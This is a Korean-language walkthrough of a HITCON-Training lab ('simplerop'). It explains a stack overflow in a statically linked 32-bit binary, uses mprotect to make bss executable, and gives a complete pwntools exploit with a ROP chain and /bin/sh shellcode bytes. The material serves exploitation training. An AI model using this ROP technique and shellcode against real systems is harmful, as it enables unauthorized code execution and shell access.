lab5
====
```
#include <stdio.h>

int main(){
	char buf[20];
	puts("ROP is easy is'nt it ?");
	printf("Your input :");
	fflush(stdout);
	read(0,buf,100);
	
}
```
이번 코드는 위와 같다.

```
root@kali:~/HITCON-Training/LAB/lab5# checksec ./simplerop
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of /root/.pwntools-cache/update to 'never'.
[*] You have the latest version of Pwntools (3.12.2)
[*] '/root/HITCON-Training/LAB/lab5/simplerop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)


root@kali:~/HITCON-Training/LAB/lab5# file simplerop
simplerop: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=bdd40d725b490b97d5a25857a6273870c7de399f, not stripped
```

이번 문제는 statically linked 바이너리이다.
static 컴파일이 되어있어서 GOT overwrite 같은 공격을 못하지만 mprotect를 이용해서 bss영역에 실행권한을 부여하면 shellcode를 이용해서 공격할 수 있다.

mprotect의 원형은 다음과 같은데   
`int mprotect(void *addr, size_t len, int prot);`
NX-Bit가 걸려있어도 mprotect() 함수를 실행시켜서 Shellcode를 실행시킬 수 있다고한다.   
mprotect()함수는 주어진 메모리 영역의 권한을 바꿀 수 있도록 해주기 때문에 prot 인자에 7을 주게 되면 RWX권한이 모두 들어가게 된다.

```
.bss = 0x80eaf80
bss 영역의 주소는 : 0x80ea000
(mprotect 함수의 인자 중 void *addr 부분이 0x1000의 배수가 되어야 한다)

gdb-peda$ x/wx read
0x806cd50 <read>:	0x0c3d8365
gdb-peda$ x/wx mprotect
0x806d870 <mprotect>:	0x24548b53

pppr : 0x804841d
```

bss, read, mprotect, pppr 가젯 주소를 모두 구했으니 이제 다음과 같은 순서로 exploit을 짜보자.

1. read(0, bss, 쉘코드길이) 로 bss영역에 쉘코드를 입력한다.
2. mprotect를 통해 쉘코드를 올린 bss영역에 실행권한을 부여한다.
3. bss영역을 실행함으로써 쉘을 따낸다.

```
from pwn import*

p = process('./simplerop')
e = ELF('./simplerop')

read=0x806cd50
mprotect=0x806d870
bss=0x80ea000
pppr=0x804841d
shellcode ='\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'

pl = ''
pl += 'a'*32
pl += p32(read)
pl += p32(pppr)
pl += p32(0)
pl += p32(bss)
pl += p32(26)
pl += p32(mprotect)
pl += p32(bss)
pl += p32(bss)
pl += p32(26)
pl += p32(7)


p.recvuntil(':')
p.send(pl)
p.send(shellcode)
p.interactive()

```

